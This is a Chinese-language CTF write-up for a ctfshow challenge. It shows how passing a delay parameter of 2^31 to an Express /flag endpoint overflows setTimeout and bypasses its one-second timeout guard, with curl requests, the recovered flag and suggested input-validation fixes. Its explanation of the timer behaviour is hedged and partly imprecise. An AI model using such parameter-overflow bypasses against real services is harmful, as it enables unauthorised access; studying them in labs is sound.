

  

## 题目信息

- **题目名称：** 新年好?

- **目标网址：** http://a769445e-9482-4157-afd2-ce4279c59419.challenge.ctf.show/

- **最终Flag：** ctfshow{3a82587f-17a3-43ed-9070-6d626e5ffe31}

  

## 漏洞分析

  

### 源代码分析

```javascript

app.get('/flag', function (req, res) {

function getflag(flag) {

res.send(flag);

}

let delay = 10 * 1000;

if (Number.isInteger(parseInt(req.query.delay))) {

delay = Math.max(delay, parseInt(req.query.delay));

}

const t = setTimeout(getflag, delay,flag);

setTimeout(() => {

clearTimeout(t);

try {

res.send('Timeout!');

} catch (e) {

}

}, 1000);

});

```

  

### 关键逻辑

1. 默认延迟：10秒（10000ms）

2. 用户可通过`delay`参数调整延迟

3. `Math.max(delay, parseInt(req.query.delay))`确保延迟不小于默认值

4. 1秒后超时机制会清除flag定时器并发送"Timeout!"

  

### 漏洞原理

当`delay=2147483648`（2^31）时：

- 这个值超过了32位有符号整数的最大值（2147483647）

- JavaScript的setTimeout在处理这种超大整数时行为异常

- 定时器可能立即执行或超时机制失效

- 导致flag在超时机制触发前发送

  

## 攻击步骤

  

### Step 1: 信息收集

```bash

curl http://a769445e-9482-4157-afd2-ce4279c59419.challenge.ctf.show/

```

获取源代码，分析setTimeout逻辑。

  

### Step 2: 测试正常情况

```bash

curl "http://a769445e-9482-4157-afd2-ce4279c59419.challenge.ctf.show/flag?delay=1000"

```

返回"Timeout!"，证明超时机制正常工作。

  

### Step 3: 尝试边界值

```bash

curl "http://a769445e-9482-4157-afd2-ce4279c59419.challenge.ctf.show/flag?delay=2147483648"

```

  

### Step 4: 获取Flag

成功返回：

```json

{"FLAG":"ctfshow{3a82587f-17a3-43ed-9070-6d626e5ffe31}"}

```

  

## 技术细节

  

### 为什么是2147483648？

- 2147483647是32位有符号整数的最大值（2^31 - 1）

- 2147483648是2^31，超过了这个边界

- JavaScript的setTimeout在处理这种值时可能出现整数溢出

- 导致定时器行为异常，绕过了1秒的超时保护

  

### JavaScript整数溢出

```javascript

parseInt("2147483648") // 返回 2147483648

Number.isInteger(2147483648) // 返回 true

Math.max(10000, 2147483648) // 返回 2147483648

```

  

### setTimeout边界条件

当setTimeout接收到超大整数时：

1. 可能立即执行回调

2. 或者超时机制失效

3. 取决于JavaScript引擎的具体实现

  

## 防御建议

  

### 输入验证

```javascript

// 添加合理的上限检查

if (Number.isInteger(parseInt(req.query.delay))) {

const userDelay = parseInt(req.query.delay);

if (userDelay >= 0 && userDelay <= 300000) { // 最大5分钟

delay = Math.max(delay, userDelay);

}

}

```

  

### 使用安全的定时器

```javascript

// 使用更安全的方式处理定时器

const t = setTimeout(() => {

try {

res.send(flag);

} catch (e) {

console.error('Response already sent');

}

}, delay);

  

// 添加超时保护

const timeoutId = setTimeout(() => {

clearTimeout(t);

if (!res.headersSent) {

res.send('Timeout!');

}

}, 1000);

```

  

## 总结

  

这个题目展示了JavaScript在处理边界条件时的潜在安全问题。通过利用setTimeout在处理超大整数时的异常行为，我们成功绕过了超时保护机制获取了flag。

  

关键学习点：

1. 理解JavaScript的整数边界和溢出行为

2. 掌握setTimeout的工作原理和边界条件

3. 学会在Web应用中进行适当的输入验证

4. 了解定时器相关的安全考虑

  

这种类型的漏洞在实际应用中可能导致拒绝服务或逻辑绕过，因此在开发中应该对用户输入进行严格验证。